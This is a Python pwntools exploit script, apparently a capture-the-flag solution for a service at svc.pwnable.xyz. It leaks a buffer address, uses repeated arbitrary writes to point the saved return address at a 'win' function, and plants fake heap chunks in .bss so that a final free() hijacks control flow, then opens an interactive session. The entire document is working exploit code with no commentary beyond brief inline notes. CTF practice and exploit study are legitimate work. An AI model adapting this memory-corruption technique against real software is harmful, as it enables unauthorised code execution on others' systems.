from pwn import *

# context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30005)
s = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
win = e.symbols['win']
bss = 0x601038

sla('>','2')
buf = int(p.recvline().strip(),16)
log.info('buf : ' + hex(buf))
ret = buf + 0x58
log.info('return : ' + hex(ret))

sla('>','1')
s('A'*8+p64(ret)) # buf -> ret
sla('>','3')

sla('>','1')
s(p64(win)+p64(bss)) # ret -> win
sla('>','3')

sla('>','1')
s(p64(0x51)+p64(bss+80)) # fake chunk1
sla('>','3')

sla('>','1')
s(p64(0x51)+p64(bss+8)) # fake chunk2
sla('>','3')
#raw_input()

sla('>','0') # free(buf) -> ret -> win

p.interactive()